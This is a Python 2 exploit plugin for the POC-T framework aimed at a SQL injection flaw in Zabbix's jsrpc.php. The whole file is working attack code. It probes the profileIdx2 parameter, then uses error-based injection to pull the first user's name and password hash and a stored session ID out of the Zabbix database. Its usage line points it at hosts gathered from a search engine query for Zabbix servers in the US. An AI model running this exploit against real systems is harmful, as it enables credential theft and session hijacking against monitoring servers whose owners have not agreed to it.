#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author B0t0w1


"""
ZABBIX jsrpc.php SQL Inject Vulnerability (MySQL Exploit)

Usage:
  python POC-T.py -s zabbix-jsrpc-mysql-exp -aZ "zabbix country:us"

"""

import re
import urllib2


def poc(url):
    url = url if '://' in url else 'http://' + url
    if url[-1] != '/': url += '/'
    passwd_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    session_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    payload_deteck = "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib2.urlopen(url + payload_deteck, timeout=10).read()
    except Exception, msg:
        # print msg
        pass
    else:
        key_reg = re.compile(r"INSERT\s*INTO\s*profiles")
        Passwd = ""
        Session_id = ""
        if key_reg.findall(response):
            payload_inject = url + "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + urllib2.quote(
                passwd_sql) + "&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            try:
                response = urllib2.urlopen(payload_inject, timeout=10).read()
            except Exception, msg:
                # print msg
                pass
            else:
                result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
                results = result_reg.findall(response)
                if results:
                    Passwd = "password_md5:" + results[0]
            payload_inject = url + "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + urllib2.quote(
                session_sql) + "&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            try:
                response = urllib2.urlopen(payload_inject, timeout=10).read()
            except Exception, msg:
                # print msg
                pass
            else:
                result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
                results = result_reg.findall(response)
                if results:
                    Session_id = "Session_id:" + results[0]
                    return (url, Passwd, Session_id)
    return False
